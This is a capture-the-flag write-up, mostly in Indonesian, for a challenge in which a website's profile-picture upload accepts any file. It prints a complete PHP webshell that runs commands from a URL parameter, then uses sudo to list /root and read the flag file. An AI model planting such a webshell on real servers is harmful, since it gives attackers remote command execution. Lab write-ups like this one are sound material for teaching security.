### WRITE UP
![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-08-14%20095127.png?raw=true)

## Description
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

## Hint
- File upload was not sanitized
- Whenever you get a shell on a remote machine, check `sudo -l`

## Penyelesaian

### 1. Observasi Fitur Upload

Pada tahap awal pengerjaan, saya diberikan sebuah tautan (link) menuju sebuah aplikasi web yang menjadi target eksploitasi. 

![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-08-14%20101655.png?raw=true)

Aplikasi tersebut memiliki sebuah fitur yang memungkinkan pengguna untuk mengunggah file gambar berformat PNG guna dijadikan foto profil.

### 2. Analisis Hint
Berdasarkan hint yang diberikan pada soal, saya mengetahui bahwa proses validasi terhadap file yang diunggah (file upload) tidak dilakukan dengan baik atau tidak disanitasi. Berdasarkan informasi tersebut, saya berinisiatif untuk mencoba mengunggah sebuah file PHP webshell guna menguji kerentanan tersebut.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

### 3. Percobaan Upload File PHP Webshell
Saya melakukan percobaan untuk mengunggah file PHP webshell melalui fitur upload foto profil tersebut.

![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-08-14%20102203.png?raw=true)

Hasilnya, proses unggah berhasil dilakukan tanpa adanya penolakan dari sistem, baik dari sisi validasi ekstensi maupun tipe konten file.

![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-08-14%20102212.png?raw=true)

### 4. Pencarian Flag

Setelah file berhasil diunggah, saya melakukan penelusuran pada direktori `/root` dengan command `sudo ls /root` untuk mencari flag.

![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-08-14%20102513.png?raw=true)

Setelah ditemukan, saya menggunakan command `sudo cat /root/flag.txt` untuk melihat isi flag.

![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-08-14%20102647.png?raw=true)

